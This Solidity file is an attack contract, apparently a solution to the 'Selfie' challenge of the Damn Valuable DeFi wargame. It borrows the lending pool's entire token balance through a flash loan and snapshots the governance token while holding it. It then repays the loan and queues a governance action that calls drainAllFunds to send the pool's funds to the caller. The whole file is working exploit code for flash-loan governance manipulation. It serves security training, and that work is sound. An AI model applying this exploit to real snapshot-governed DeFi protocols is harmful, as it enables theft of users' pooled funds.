// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "../DamnValuableTokenSnapshot.sol";

interface LendPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface Governance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttack {
    using Address for address;

    address public lendingPool;
    address public governance;
    address public token;
    uint256 private actionId;

    constructor(
        address _lendingPool,
        address _governance,
        address _token
    ) {
        lendingPool = _lendingPool;
        governance = _governance;
        token = _token;
    }

    function receiveTokens(address tokenAdd, uint256 amount) external {
        // Snapshot
        DamnValuableTokenSnapshot(tokenAdd).snapshot();
        // console.log("CONTRACT::: Took snapshot!");

        // Pay back
        ERC20(tokenAdd).transfer(lendingPool, amount);
        // console.log("CONTRACT::: Payed back!");
    }

    function attackGovernance() public returns (uint256) {
        // take loan
        uint256 poolBalance = ERC20(token).balanceOf(lendingPool);
        LendPool(lendingPool).flashLoan(poolBalance);
        // console.log("CONTRACT::: Finished Attacking!");

        // Propose
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            msg.sender
        );
        actionId = Governance(governance).queueAction(
            lendingPool,
            payload,
            0 ether
        );
        // console.log("CONTRACT::: Proposed!");

        return actionId;
    }

    function getActionId() public view returns (uint256) {
        return actionId;
    }
}
